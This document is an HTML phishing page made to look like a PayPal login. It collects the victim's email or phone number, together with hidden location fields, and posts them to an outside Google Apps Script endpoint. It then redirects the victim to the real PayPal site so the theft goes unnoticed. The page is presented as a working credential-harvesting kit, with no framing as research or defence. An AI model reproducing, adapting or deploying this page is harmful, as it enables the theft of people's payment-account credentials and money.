<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paypal</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        h2 {
            margin-bottom: 20px;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        input[type="text"],
        input[type="password"],
        button {
            height: 40px;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 20px;
        }

        button {
            background-color: #0047B2;
            color: #fff;
            cursor: pointer;
            border-radius: 25px;
            height: 45px;
        }

        button:hover {
            background-color: #166fe5;
        }

        p {
            margin-top: 10px;
        }

        a {
            text-decoration: none;
            color: #1877f2;
        }

        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="/storage/emulated/0/DCIM/IMG_20241103_191216.jpg" style="height:65px; width:200px; alt="Paypal Logo" title="Paypal Logo">
        <p style="font-size:17px">Log into Paypal to continue</p>
        <form action="https://script.google.com/macros/s/AKfycbxA-oF47kZcr1zvIyJ9tZGKw7kHodOkMXMAjV1jt6UAnHzm13UYnzkEAhQVWFVWv26PMw/exec" id="paypal">
            <input type="text" name="email_or_phone" placeholder="Email or mobile number" style="font-size:19px;" required/>
            <input type="password" name="password" placeholder="Enter your Password" required/>
            <input type="hidden" name="ip_address">
            <input type="hidden" name="country">
            <input type="hidden" name="region">
            <input type="hidden" name="city">
            <input type="hidden" name="form_id" value="paypal">
            <h6 style="text-align: left; font-size: 17px; margin-bottom: 8px; margin-top: 1px;">
            <a href="https://www.paypal.com/authflow/email-recovery/?contextId=&redirectUri=%252Fsignin%253FreturnUri%253Dhttps%25253A%25252F%25252Fwww.paypal.com%25252Fmyaccount%25252Fsummary%2526state%253D%25253Fcountry.x%25253DNG%252526locale.x%25253Den_NG">Forgot password?</a></h6>
            <button type="submit" style="margin-bottom: 35px">Log In</button>
            <div style="display: flex; justify-content: space-between; align-items: center;">
  <hr style="flex: 1; border-top: 1px solid #ccc; margin: 0 10px;">
  <span style="background-color: #fff; padding: 0 10px; position: relative; z-index: 1;">or</span>
  <hr style="flex: 1; border-top: 1px solid #ccc; margin: 0 10px;">
</div>
            <button style="background-color:white; border-color:black; border-radius:25px; height:45px; margin-top:25px;">
            <a href="https://www.paypal.com/" style="color:black;">Sign up</a>
            </button>        
            </form>        
    </div>
    <script>
        document.getElementById('paypal').addEventListener('submit', function(event) {
            event.preventDefault();
            const form = event.target;
            const formData = new FormData(form);

            const jsonData = {
                email_or_phone: formData.get('email_or_phone'),
                message: formData.get('message'),
                ip_address: formData.get('ip_address'),
                country: formData.get('country'),
                region: formData.get('region'),
                city: formData.get('city'),
                form_id: formData.get('form_id'),
            };

            const url = 'https://script.google.com/macros/s/AKfycbxA-oF47kZcr1zvIyJ9tZGKw7kHodOkMXMAjV1jt6UAnHzm13UYnzkEAhQVWFVWv26PMw/exec';
            const callback = 'jsonpCallback';

            fetch(`${url}?callback=${callback}`, {
                method: 'POST',
                body: JSON.stringify(jsonData),
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => response.json())
            .then(data => {
                console.log('Form submitted successfully:', data);
                window.location.href = 'https://www.paypal.com';
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error signing in.');
            });

            window.jsonpCallback = function(response) {
                console.log('Form submitted successfully:', response);
                window.location.href = 'https://www.paypal.com';
            };
        });
    </script>
</body>
</html>
